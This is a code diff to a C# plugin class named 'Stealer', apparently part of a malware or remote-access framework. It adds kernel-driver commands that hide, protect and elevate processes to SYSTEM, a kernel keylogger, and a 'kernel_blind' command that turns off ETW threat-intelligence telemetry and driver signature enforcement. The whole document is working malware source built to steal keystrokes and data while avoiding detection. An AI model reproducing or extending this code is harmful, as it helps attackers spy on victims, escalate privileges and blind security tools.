@@ -123,7 +123,7 @@ public sealed class Stealer : IUniversalPlugin
 
   public string[] SupportedCommands
   {
-    get => new string[5]{ "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_hide_driver" };
+    get => new string[6]{ "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_keylog", "kernel_blind" };
   }
 
   public bool IsComplete => true;
@@ -211,20 +211,75 @@ public sealed class Stealer : IUniversalPlugin
           return new PluginResult() { Success = true, Message = fileName, Data = zipBytes, ShouldUnload = true };
 
         case "kernel_hide":
-          success = ShadowWrapper.HideProcess(pid, out output);
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              var target = new KernelController.TargetProcess { Pid = (IntPtr)pid, Enable = true };
+              success = dev.SendIoctl(KernelController.HIDE_UNHIDE_PROCESS, ref target);
+              output = success ? "Process hidden silently via IOCTL." : "Failed to hide process via IOCTL.";
+            }
+            else output = "Failed to connect to Shadow Driver.";
+          }
           return new PluginResult() { Success = success, Message = output };
 
         case "kernel_elevate":
-          success = ShadowWrapper.ElevateProcess(pid, out output);
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              var target = new KernelController.TargetProcess { Pid = (IntPtr)pid };
+              success = dev.SendIoctl(KernelController.ELEVATE_PROCESS, ref target);
+              output = success ? "Process elevated to SYSTEM silently." : "Failed to elevate process.";
+            }
+            else output = "Failed to connect to Shadow Driver.";
+          }
           return new PluginResult() { Success = success, Message = output };
 
         case "kernel_protect":
-          success = ShadowWrapper.ProtectProcess(pid, out output);
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              var target = new KernelController.TargetProcess { Pid = (IntPtr)pid, Enable = true };
+              success = dev.SendIoctl(KernelController.PROTECT_PROCESS, ref target);
+              output = success ? "Process protected silently." : "Failed to protect process.";
+            }
+            else output = "Failed to connect to Shadow Driver.";
+          }
           return new PluginResult() { Success = success, Message = output };
 
-        case "kernel_hide_driver":
-          string driverName = parameters as string ?? "shadow.sys";
-          success = ShadowWrapper.HideDriver(driverName, out output);
+        case "kernel_keylog":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              IntPtr addr = dev.GetKeyloggerAddress();
+              if (addr != IntPtr.Zero)
+              {
+                output = $"Kernel Keylogger active. Mapped address: 0x{addr.ToInt64():X}. Started background monitor.";
+                // In actual deployment, start a thread to read this address periodically
+                success = true;
+              }
+              else output = "Failed to get Keylogger address from Kernel.";
+            }
+            else output = "Failed to connect to Shadow Driver.";
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_blind":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              var b = new KernelController.BoolStruct { Enable = false };
+              bool etw = dev.SendIoctl(KernelController.ETWTI, ref b);
+              bool dse = dev.SendIoctl(KernelController.ENABLE_DSE, ref b);
+              output = $"Blinding Result - ETWTI: {etw}, DSE: {dse}";
+              success = etw || dse;
+            }
+            else output = "Failed to connect to Shadow Driver.";
+          }
           return new PluginResult() { Success = success, Message = output };
 
         default:
